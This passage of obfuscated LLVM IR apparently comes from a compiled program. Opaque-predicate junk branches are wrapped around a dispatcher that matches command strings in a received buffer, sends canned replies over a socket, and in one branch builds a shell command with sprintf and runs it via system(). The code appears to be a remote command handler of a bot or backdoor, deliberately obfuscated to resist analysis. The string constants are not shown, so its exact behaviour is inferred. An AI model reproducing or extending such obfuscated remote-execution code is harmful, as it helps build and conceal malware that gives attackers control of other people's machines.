  %3395 = or i1 %3393, %3394
  br i1 %3395, label %originalBBpart2408, label %originalBB406alteredBB

originalBBpart2408:                               ; preds = %originalBB406
  br label %4206

; <label>:3396:                                   ; preds = %originalBBpart2404
  %3397 = load i32, i32* @x.17
  %3398 = load i32, i32* @y.18
  %3399 = sub i32 %3397, 1
  %3400 = mul i32 %3397, %3399
  %3401 = urem i32 %3400, 2
  %3402 = icmp eq i32 %3401, 0
  %3403 = icmp slt i32 %3398, 10
  %3404 = or i1 %3402, %3403
  br i1 %3404, label %originalBB410, label %originalBB410alteredBB

originalBB410:                                    ; preds = %originalBB410alteredBB, %3396
  %3405 = load i32, i32* @x.17
  %3406 = load i32, i32* @y.18
  %3407 = sub i32 %3405, 1
  %3408 = mul i32 %3405, %3407
  %3409 = urem i32 %3408, 2
  %3410 = icmp eq i32 %3409, 0
  %3411 = icmp slt i32 %3406, 10
  %3412 = or i1 %3410, %3411
  br i1 %3412, label %originalBBpart2412, label %originalBB410alteredBB

originalBBpart2412:                               ; preds = %originalBB410
  br label %3413

; <label>:3413:                                   ; preds = %originalBBpart2412, %3350
  %3414 = load i32, i32* @x.17
  %3415 = load i32, i32* @y.18
  %3416 = sub i32 %3414, 1
  %3417 = mul i32 %3414, %3416
  %3418 = urem i32 %3417, 2
  %3419 = icmp eq i32 %3418, 0
  %3420 = icmp slt i32 %3415, 10
  %3421 = or i1 %3419, %3420
  br i1 %3421, label %originalBB414, label %originalBB414alteredBB

originalBB414:                                    ; preds = %originalBB414alteredBB, %3413
  %3422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3423 = call i8* @strstr(i8* %3422, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.166, i32 0, i32 0)) #8
  %3424 = icmp ne i8* %3423, null
  %3425 = load i32, i32* @x.17
  %3426 = load i32, i32* @y.18
  %3427 = sub i32 %3425, 1
  %3428 = mul i32 %3425, %3427
  %3429 = urem i32 %3428, 2
  %3430 = icmp eq i32 %3429, 0
  %3431 = icmp slt i32 %3426, 10
  %3432 = or i1 %3430, %3431
  br i1 %3432, label %originalBBpart2416, label %originalBB414alteredBB

originalBBpart2416:                               ; preds = %originalBB414
  br i1 %3424, label %3433, label %3476

; <label>:3433:                                   ; preds = %originalBBpart2416
  %3434 = load i32, i32* @x.17
  %3435 = load i32, i32* @y.18
  %3436 = sub i32 %3434, 1
  %3437 = mul i32 %3434, %3436
  %3438 = urem i32 %3437, 2
  %3439 = icmp eq i32 %3438, 0
  %3440 = icmp slt i32 %3435, 10
  %3441 = or i1 %3439, %3440
  br i1 %3441, label %originalBB418, label %originalBB418alteredBB

originalBB418:                                    ; preds = %originalBB418alteredBB, %3433
  %3442 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3443 = call i32 (i8*, i8*, ...) @sprintf(i8* %3442, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.167, i32 0, i32 0)) #7
  %3444 = load i32, i32* %4, align 4
  %3445 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3446 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3447 = call i64 @strlen(i8* %3446) #8
  %3448 = call i64 @send(i32 %3444, i8* %3445, i64 %3447, i32 16384)
  %3449 = icmp eq i64 %3448, -1
  %3450 = load i32, i32* @x.17
  %3451 = load i32, i32* @y.18
  %3452 = sub i32 %3450, 1
  %3453 = mul i32 %3450, %3452
  %3454 = urem i32 %3453, 2
  %3455 = icmp eq i32 %3454, 0
  %3456 = icmp slt i32 %3451, 10
  %3457 = or i1 %3455, %3456
  br i1 %3457, label %originalBBpart2420, label %originalBB418alteredBB

originalBBpart2420:                               ; preds = %originalBB418
  br i1 %3449, label %3458, label %3475

; <label>:3458:                                   ; preds = %originalBBpart2420
  %3459 = load i32, i32* @x.17
  %3460 = load i32, i32* @y.18
  %3461 = sub i32 %3459, 1
  %3462 = mul i32 %3459, %3461
  %3463 = urem i32 %3462, 2
  %3464 = icmp eq i32 %3463, 0
  %3465 = icmp slt i32 %3460, 10
  %3466 = or i1 %3464, %3465
  br i1 %3466, label %originalBB422, label %originalBB422alteredBB

originalBB422:                                    ; preds = %originalBB422alteredBB, %3458
  store i8* null, i8** %2, align 8
  %3467 = load i32, i32* @x.17
  %3468 = load i32, i32* @y.18
  %3469 = sub i32 %3467, 1
  %3470 = mul i32 %3467, %3469
  %3471 = urem i32 %3470, 2
  %3472 = icmp eq i32 %3471, 0
  %3473 = icmp slt i32 %3468, 10
  %3474 = or i1 %3472, %3473
  br i1 %3474, label %originalBBpart2424, label %originalBB422alteredBB

originalBBpart2424:                               ; preds = %originalBB422
  br label %4206

; <label>:3475:                                   ; preds = %originalBBpart2420
  br label %3476

; <label>:3476:                                   ; preds = %3475, %originalBBpart2416
  %3477 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3478 = call i8* @strstr(i8* %3477, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.168, i32 0, i32 0)) #8
  %3479 = icmp ne i8* %3478, null
  br i1 %3479, label %3480, label %3491

; <label>:3480:                                   ; preds = %3476
  %3481 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3482 = call i32 (i8*, i8*, ...) @sprintf(i8* %3481, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.169, i32 0, i32 0)) #7
  %3483 = load i32, i32* %4, align 4
  %3484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3485 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3486 = call i64 @strlen(i8* %3485) #8
  %3487 = call i64 @send(i32 %3483, i8* %3484, i64 %3486, i32 16384)
  %3488 = icmp eq i64 %3487, -1
  br i1 %3488, label %3489, label %3490

; <label>:3489:                                   ; preds = %3480
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3490:                                   ; preds = %3480
  br label %3491

; <label>:3491:                                   ; preds = %3490, %3476
  %3492 = load i32, i32* @x.17
  %3493 = load i32, i32* @y.18
  %3494 = sub i32 %3492, 1
  %3495 = mul i32 %3492, %3494
  %3496 = urem i32 %3495, 2
  %3497 = icmp eq i32 %3496, 0
  %3498 = icmp slt i32 %3493, 10
  %3499 = or i1 %3497, %3498
  br i1 %3499, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %3491
  %3500 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3501 = call i8* @strstr(i8* %3500, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.170, i32 0, i32 0)) #8
  %3502 = icmp ne i8* %3501, null
  %3503 = load i32, i32* @x.17
  %3504 = load i32, i32* @y.18
  %3505 = sub i32 %3503, 1
  %3506 = mul i32 %3503, %3505
  %3507 = urem i32 %3506, 2
  %3508 = icmp eq i32 %3507, 0
  %3509 = icmp slt i32 %3504, 10
  %3510 = or i1 %3508, %3509
  br i1 %3510, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br i1 %3502, label %3511, label %3554

; <label>:3511:                                   ; preds = %originalBBpart2428
  %3512 = load i32, i32* @x.17
  %3513 = load i32, i32* @y.18
  %3514 = sub i32 %3512, 1
  %3515 = mul i32 %3512, %3514
  %3516 = urem i32 %3515, 2
  %3517 = icmp eq i32 %3516, 0
  %3518 = icmp slt i32 %3513, 10
  %3519 = or i1 %3517, %3518
  br i1 %3519, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %3511
  %3520 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3521 = call i32 (i8*, i8*, ...) @sprintf(i8* %3520, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.171, i32 0, i32 0)) #7
  %3522 = load i32, i32* %4, align 4
  %3523 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3524 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3525 = call i64 @strlen(i8* %3524) #8
  %3526 = call i64 @send(i32 %3522, i8* %3523, i64 %3525, i32 16384)
  %3527 = icmp eq i64 %3526, -1
  %3528 = load i32, i32* @x.17
  %3529 = load i32, i32* @y.18
  %3530 = sub i32 %3528, 1
  %3531 = mul i32 %3528, %3530
  %3532 = urem i32 %3531, 2
  %3533 = icmp eq i32 %3532, 0
  %3534 = icmp slt i32 %3529, 10
  %3535 = or i1 %3533, %3534
  br i1 %3535, label %originalBBpart2432, label %originalBB430alteredBB

originalBBpart2432:                               ; preds = %originalBB430
  br i1 %3527, label %3536, label %3537

; <label>:3536:                                   ; preds = %originalBBpart2432
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3537:                                   ; preds = %originalBBpart2432
  %3538 = load i32, i32* @x.17
  %3539 = load i32, i32* @y.18
  %3540 = sub i32 %3538, 1
  %3541 = mul i32 %3538, %3540
  %3542 = urem i32 %3541, 2
  %3543 = icmp eq i32 %3542, 0
  %3544 = icmp slt i32 %3539, 10
  %3545 = or i1 %3543, %3544
  br i1 %3545, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %3537
  %3546 = load i32, i32* @x.17
  %3547 = load i32, i32* @y.18
  %3548 = sub i32 %3546, 1
  %3549 = mul i32 %3546, %3548
  %3550 = urem i32 %3549, 2
  %3551 = icmp eq i32 %3550, 0
  %3552 = icmp slt i32 %3547, 10
  %3553 = or i1 %3551, %3552
  br i1 %3553, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br label %3554

; <label>:3554:                                   ; preds = %originalBBpart2436, %originalBBpart2428
  %3555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3556 = call i8* @strstr(i8* %3555, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i32 0, i32 0)) #8
  %3557 = icmp ne i8* %3556, null
  br i1 %3557, label %3558, label %3569

; <label>:3558:                                   ; preds = %3554
  %3559 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3560 = call i32 (i8*, i8*, ...) @sprintf(i8* %3559, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.173, i32 0, i32 0)) #7
  %3561 = load i32, i32* %4, align 4
  %3562 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3563 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3564 = call i64 @strlen(i8* %3563) #8
  %3565 = call i64 @send(i32 %3561, i8* %3562, i64 %3564, i32 16384)
  %3566 = icmp eq i64 %3565, -1
  br i1 %3566, label %3567, label %3568

; <label>:3567:                                   ; preds = %3558
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3568:                                   ; preds = %3558
  br label %3569

; <label>:3569:                                   ; preds = %3568, %3554
  %3570 = load i32, i32* @x.17
  %3571 = load i32, i32* @y.18
  %3572 = sub i32 %3570, 1
  %3573 = mul i32 %3570, %3572
  %3574 = urem i32 %3573, 2
  %3575 = icmp eq i32 %3574, 0
  %3576 = icmp slt i32 %3571, 10
  %3577 = or i1 %3575, %3576
  br i1 %3577, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %3569
  %3578 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3579 = call i8* @strstr(i8* %3578, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0)) #8
  %3580 = icmp ne i8* %3579, null
  %3581 = load i32, i32* @x.17
  %3582 = load i32, i32* @y.18
  %3583 = sub i32 %3581, 1
  %3584 = mul i32 %3581, %3583
  %3585 = urem i32 %3584, 2
  %3586 = icmp eq i32 %3585, 0
  %3587 = icmp slt i32 %3582, 10
  %3588 = or i1 %3586, %3587
  br i1 %3588, label %originalBBpart2440, label %originalBB438alteredBB

originalBBpart2440:                               ; preds = %originalBB438
  br i1 %3580, label %3589, label %3600

; <label>:3589:                                   ; preds = %originalBBpart2440
  %3590 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3591 = call i32 (i8*, i8*, ...) @sprintf(i8* %3590, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.175, i32 0, i32 0)) #7
  %3592 = load i32, i32* %4, align 4
  %3593 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3594 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3595 = call i64 @strlen(i8* %3594) #8
  %3596 = call i64 @send(i32 %3592, i8* %3593, i64 %3595, i32 16384)
  %3597 = icmp eq i64 %3596, -1
  br i1 %3597, label %3598, label %3599

; <label>:3598:                                   ; preds = %3589
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3599:                                   ; preds = %3589
  br label %3600

; <label>:3600:                                   ; preds = %3599, %originalBBpart2440
  %3601 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3602 = call i8* @strstr(i8* %3601, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.176, i32 0, i32 0)) #8
  %3603 = icmp ne i8* %3602, null
  br i1 %3603, label %3608, label %3604

; <label>:3604:                                   ; preds = %3600
  %3605 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3606 = call i8* @strstr(i8* %3605, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.177, i32 0, i32 0)) #8
  %3607 = icmp ne i8* %3606, null
  br i1 %3607, label %3608, label %3651

; <label>:3608:                                   ; preds = %3604, %3600
  %3609 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %3610 = bitcast i8** %3609 to i8*
  %3611 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %3612 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %3613 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %3614 = call i32 (i8*, i8*, ...) @sprintf(i8* %3610, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.178, i32 0, i32 0), i8** %3611, i8** %3612, i8** %3613) #7
  %3615 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %3616 = bitcast i8** %3615 to i8*
  %3617 = call i32 @system(i8* %3616)
  %3618 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %3619 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %3620 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %3621 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %3618, i8** %3619, i8** %3620)
  %3622 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3623 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %3624 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %3625 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %3626 = call i32 (i8*, i8*, ...) @sprintf(i8* %3622, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %3623, i8** %3624, i8** %3625) #7
  %3627 = load i32, i32* %4, align 4
  %3628 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3629 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3630 = call i64 @strlen(i8* %3629) #8
  %3631 = call i64 @send(i32 %3627, i8* %3628, i64 %3630, i32 16384)
  %3632 = icmp eq i64 %3631, -1
  br i1 %3632, label %3633, label %3634

; <label>:3633:                                   ; preds = %3608
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3634:                                   ; preds = %3608
  %3635 = load i32, i32* @x.17
  %3636 = load i32, i32* @y.18
  %3637 = sub i32 %3635, 1
  %3638 = mul i32 %3635, %3637
  %3639 = urem i32 %3638, 2
  %3640 = icmp eq i32 %3639, 0
  %3641 = icmp slt i32 %3636, 10
  %3642 = or i1 %3640, %3641
  br i1 %3642, label %originalBB442, label %originalBB442alteredBB

originalBB442:                                    ; preds = %originalBB442alteredBB, %3634
  %3643 = load i32, i32* @x.17
  %3644 = load i32, i32* @y.18
  %3645 = sub i32 %3643, 1
  %3646 = mul i32 %3643, %3645
  %3647 = urem i32 %3646, 2
  %3648 = icmp eq i32 %3647, 0
  %3649 = icmp slt i32 %3644, 10
  %3650 = or i1 %3648, %3649
  br i1 %3650, label %originalBBpart2444, label %originalBB442alteredBB

originalBBpart2444:                               ; preds = %originalBB442
  br label %3651

; <label>:3651:                                   ; preds = %originalBBpart2444, %3604
  %3652 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3653 = call i8* @strstr(i8* %3652, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.180, i32 0, i32 0)) #8
  %3654 = icmp ne i8* %3653, null
  br i1 %3654, label %3655, label %3682

; <label>:3655:                                   ; preds = %3651
  %3656 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3657 = call i32 (i8*, i8*, ...) @sprintf(i8* %3656, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.181, i32 0, i32 0)) #7
  %3658 = load i32, i32* %4, align 4
  %3659 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3661 = call i64 @strlen(i8* %3660) #8
  %3662 = call i64 @send(i32 %3658, i8* %3659, i64 %3661, i32 16384)
  %3663 = icmp eq i64 %3662, -1
  br i1 %3663, label %3664, label %3681

; <label>:3664:                                   ; preds = %3655
  %3665 = load i32, i32* @x.17
  %3666 = load i32, i32* @y.18
  %3667 = sub i32 %3665, 1
  %3668 = mul i32 %3665, %3667
  %3669 = urem i32 %3668, 2
  %3670 = icmp eq i32 %3669, 0
  %3671 = icmp slt i32 %3666, 10
  %3672 = or i1 %3670, %3671
  br i1 %3672, label %originalBB446, label %originalBB446alteredBB

originalBB446:                                    ; preds = %originalBB446alteredBB, %3664
  store i8* null, i8** %2, align 8
  %3673 = load i32, i32* @x.17
  %3674 = load i32, i32* @y.18
  %3675 = sub i32 %3673, 1
  %3676 = mul i32 %3673, %3675
  %3677 = urem i32 %3676, 2
  %3678 = icmp eq i32 %3677, 0
  %3679 = icmp slt i32 %3674, 10
  %3680 = or i1 %3678, %3679
  br i1 %3680, label %originalBBpart2448, label %originalBB446alteredBB

originalBBpart2448:                               ; preds = %originalBB446
  br label %4206

; <label>:3681:                                   ; preds = %3655
  br label %3682

; <label>:3682:                                   ; preds = %3681, %3651
  %3683 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3684 = call i8* @strstr(i8* %3683, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0)) #8
  %3685 = icmp ne i8* %3684, null
  br i1 %3685, label %3686, label %3697

; <label>:3686:                                   ; preds = %3682
  %3687 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3688 = call i32 (i8*, i8*, ...) @sprintf(i8* %3687, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.183, i32 0, i32 0)) #7
  %3689 = load i32, i32* %4, align 4
  %3690 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3691 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3692 = call i64 @strlen(i8* %3691) #8
  %3693 = call i64 @send(i32 %3689, i8* %3690, i64 %3692, i32 16384)
  %3694 = icmp eq i64 %3693, -1
  br i1 %3694, label %3695, label %3696

; <label>:3695:                                   ; preds = %3686
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3696:                                   ; preds = %3686
  br label %3697

; <label>:3697:                                   ; preds = %3696, %3682
  %3698 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3699 = call i8* @strstr(i8* %3698, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i32 0, i32 0)) #8
  %3700 = icmp ne i8* %3699, null
  br i1 %3700, label %3701, label %3744

; <label>:3701:                                   ; preds = %3697
  %3702 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3703 = call i32 (i8*, i8*, ...) @sprintf(i8* %3702, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.185, i32 0, i32 0)) #7
  %3704 = load i32, i32* %4, align 4
  %3705 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3707 = call i64 @strlen(i8* %3706) #8
  %3708 = call i64 @send(i32 %3704, i8* %3705, i64 %3707, i32 16384)
  %3709 = icmp eq i64 %3708, -1
  br i1 %3709, label %3710, label %3727

; <label>:3710:                                   ; preds = %3701
  %3711 = load i32, i32* @x.17
  %3712 = load i32, i32* @y.18
  %3713 = sub i32 %3711, 1
  %3714 = mul i32 %3711, %3713
  %3715 = urem i32 %3714, 2
  %3716 = icmp eq i32 %3715, 0
  %3717 = icmp slt i32 %3712, 10
  %3718 = or i1 %3716, %3717
  br i1 %3718, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %3710
  store i8* null, i8** %2, align 8
  %3719 = load i32, i32* @x.17
  %3720 = load i32, i32* @y.18
  %3721 = sub i32 %3719, 1
  %3722 = mul i32 %3719, %3721
  %3723 = urem i32 %3722, 2
  %3724 = icmp eq i32 %3723, 0
  %3725 = icmp slt i32 %3720, 10
  %3726 = or i1 %3724, %3725
  br i1 %3726, label %originalBBpart2452, label %originalBB450alteredBB

originalBBpart2452:                               ; preds = %originalBB450
  br label %4206

; <label>:3727:                                   ; preds = %3701
  %3728 = load i32, i32* @x.17
  %3729 = load i32, i32* @y.18
  %3730 = sub i32 %3728, 1
  %3731 = mul i32 %3728, %3730
  %3732 = urem i32 %3731, 2
  %3733 = icmp eq i32 %3732, 0
  %3734 = icmp slt i32 %3729, 10
  %3735 = or i1 %3733, %3734
  br i1 %3735, label %originalBB454, label %originalBB454alteredBB

originalBB454:                                    ; preds = %originalBB454alteredBB, %3727
  %3736 = load i32, i32* @x.17
  %3737 = load i32, i32* @y.18
  %3738 = sub i32 %3736, 1
  %3739 = mul i32 %3736, %3738
  %3740 = urem i32 %3739, 2
  %3741 = icmp eq i32 %3740, 0
  %3742 = icmp slt i32 %3737, 10
  %3743 = or i1 %3741, %3742
  br i1 %3743, label %originalBBpart2456, label %originalBB454alteredBB

originalBBpart2456:                               ; preds = %originalBB454
  br label %3744

; <label>:3744:                                   ; preds = %originalBBpart2456, %3697
  %3745 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3746 = call i8* @strstr(i8* %3745, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.186, i32 0, i32 0)) #8
  %3747 = icmp ne i8* %3746, null
  br i1 %3747, label %3748, label %3775

; <label>:3748:                                   ; preds = %3744
  %3749 = load i32, i32* @x.17
  %3750 = load i32, i32* @y.18
  %3751 = sub i32 %3749, 1
  %3752 = mul i32 %3749, %3751
  %3753 = urem i32 %3752, 2
  %3754 = icmp eq i32 %3753, 0
  %3755 = icmp slt i32 %3750, 10
  %3756 = or i1 %3754, %3755
  br i1 %3756, label %originalBB458, label %originalBB458alteredBB

originalBB458:                                    ; preds = %originalBB458alteredBB, %3748
  %3757 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3758 = call i32 (i8*, i8*, ...) @sprintf(i8* %3757, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.187, i32 0, i32 0)) #7
  %3759 = load i32, i32* %4, align 4
  %3760 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3761 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3762 = call i64 @strlen(i8* %3761) #8
  %3763 = call i64 @send(i32 %3759, i8* %3760, i64 %3762, i32 16384)
  %3764 = icmp eq i64 %3763, -1
  %3765 = load i32, i32* @x.17
  %3766 = load i32, i32* @y.18
  %3767 = sub i32 %3765, 1
  %3768 = mul i32 %3765, %3767
  %3769 = urem i32 %3768, 2
  %3770 = icmp eq i32 %3769, 0
  %3771 = icmp slt i32 %3766, 10
  %3772 = or i1 %3770, %3771
  br i1 %3772, label %originalBBpart2460, label %originalBB458alteredBB

originalBBpart2460:                               ; preds = %originalBB458
  br i1 %3764, label %3773, label %3774

; <label>:3773:                                   ; preds = %originalBBpart2460
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3774:                                   ; preds = %originalBBpart2460
  br label %3775

; <label>:3775:                                   ; preds = %3774, %3744
  %3776 = load i32, i32* @x.17
  %3777 = load i32, i32* @y.18
  %3778 = sub i32 %3776, 1
  %3779 = mul i32 %3776, %3778
  %3780 = urem i32 %3779, 2
  %3781 = icmp eq i32 %3780, 0
  %3782 = icmp slt i32 %3777, 10
  %3783 = or i1 %3781, %3782
  br i1 %3783, label %originalBB462, label %originalBB462alteredBB

originalBB462:                                    ; preds = %originalBB462alteredBB, %3775
  %3784 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3785 = call i8* @strstr(i8* %3784, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.188, i32 0, i32 0)) #8
  %3786 = icmp ne i8* %3785, null
  %3787 = load i32, i32* @x.17
  %3788 = load i32, i32* @y.18
  %3789 = sub i32 %3787, 1
  %3790 = mul i32 %3787, %3789
  %3791 = urem i32 %3790, 2
  %3792 = icmp eq i32 %3791, 0
  %3793 = icmp slt i32 %3788, 10
  %3794 = or i1 %3792, %3793
  br i1 %3794, label %originalBBpart2464, label %originalBB462alteredBB

originalBBpart2464:                               ; preds = %originalBB462
  br i1 %3786, label %3795, label %3806

; <label>:3795:                                   ; preds = %originalBBpart2464
  %3796 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3797 = call i32 (i8*, i8*, ...) @sprintf(i8* %3796, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.189, i32 0, i32 0)) #7
  %3798 = load i32, i32* %4, align 4
  %3799 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3800 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3801 = call i64 @strlen(i8* %3800) #8
  %3802 = call i64 @send(i32 %3798, i8* %3799, i64 %3801, i32 16384)
  %3803 = icmp eq i64 %3802, -1
  br i1 %3803, label %3804, label %3805

; <label>:3804:                                   ; preds = %3795
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3805:                                   ; preds = %3795
  br label %3806

; <label>:3806:                                   ; preds = %3805, %originalBBpart2464
  %3807 = load i32, i32* @x.17
  %3808 = load i32, i32* @y.18
  %3809 = sub i32 %3807, 1
  %3810 = mul i32 %3807, %3809
  %3811 = urem i32 %3810, 2
  %3812 = icmp eq i32 %3811, 0
  %3813 = icmp slt i32 %3808, 10
  %3814 = or i1 %3812, %3813
  br i1 %3814, label %originalBB466, label %originalBB466alteredBB

originalBB466:                                    ; preds = %originalBB466alteredBB, %3806
  %3815 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3816 = call i8* @strstr(i8* %3815, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0)) #8
  %3817 = icmp ne i8* %3816, null
  %3818 = load i32, i32* @x.17
  %3819 = load i32, i32* @y.18
  %3820 = sub i32 %3818, 1
  %3821 = mul i32 %3818, %3820
  %3822 = urem i32 %3821, 2
  %3823 = icmp eq i32 %3822, 0
  %3824 = icmp slt i32 %3819, 10
  %3825 = or i1 %3823, %3824
  br i1 %3825, label %originalBBpart2468, label %originalBB466alteredBB

originalBBpart2468:                               ; preds = %originalBB466
  br i1 %3817, label %3826, label %3837

; <label>:3826:                                   ; preds = %originalBBpart2468
  %3827 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3828 = call i32 (i8*, i8*, ...) @sprintf(i8* %3827, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.191, i32 0, i32 0)) #7
  %3829 = load i32, i32* %4, align 4
  %3830 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3831 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3832 = call i64 @strlen(i8* %3831) #8
  %3833 = call i64 @send(i32 %3829, i8* %3830, i64 %3832, i32 16384)
  %3834 = icmp eq i64 %3833, -1
  br i1 %3834, label %3835, label %3836

; <label>:3835:                                   ; preds = %3826
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3836:                                   ; preds = %3826
  br label %3837

; <label>:3837:                                   ; preds = %3836, %originalBBpart2468
  %3838 = load i32, i32* @x.17
  %3839 = load i32, i32* @y.18
  %3840 = sub i32 %3838, 1
  %3841 = mul i32 %3838, %3840
  %3842 = urem i32 %3841, 2
  %3843 = icmp eq i32 %3842, 0
  %3844 = icmp slt i32 %3839, 10
  %3845 = or i1 %3843, %3844
